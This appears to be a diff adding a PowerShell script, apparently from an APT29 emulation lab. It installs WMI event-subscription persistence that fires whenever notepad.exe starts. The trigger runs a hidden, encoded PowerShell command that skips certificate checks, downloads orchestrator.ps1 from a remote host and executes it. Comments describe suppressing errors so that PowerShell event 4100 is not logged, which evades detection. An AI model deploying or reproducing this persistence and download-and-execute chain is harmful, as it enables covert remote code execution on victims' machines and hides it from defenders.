@@ -1,0 +1,31 @@
+$S2 = "https://192.168.56.100:8443/orchestrator.ps1"
+
+@('__FilterToConsumerBinding','CommandLineEventConsumer','__EventFilter') | ForEach-Object {
+    Get-CimInstance -Namespace root/subscription -ClassName $_ -EA SilentlyContinue |
+        Where-Object { $_.Name -eq 'NotepadTrigger' } | Remove-CimInstance -EA SilentlyContinue
+}
+
+$F = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{
+    name = 'NotepadTrigger'; EventNameSpace = 'root\CimV2'; QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
+}
+
+# =========================================================
+# FIX B2: try/catch + ErrorActionPreference + exit 0
+# => DownloadString/IEX fail => khong sinh 4100
+# =========================================================
+$inner = "`$ErrorActionPreference='SilentlyContinue';try { [Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$S2') } catch { } ; exit 0"
+
+# Base64 encode (giu nguyen)
+$innerB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
+$consumerCmd = "powershell.exe -NoP -W H -Exec Bypass -Enc $innerB64"
+
+$C = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{
+    name = 'NotepadTrigger'; CommandLineTemplate = $consumerCmd
+}
+
+New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
+    Filter = [Ref]$F; Consumer = [Ref]$C
+} | Out-Null
+
+"WMI done $(Get-Date)" | Out-File "C:\Users\Public\apt29\wmi_setup.log" -Append
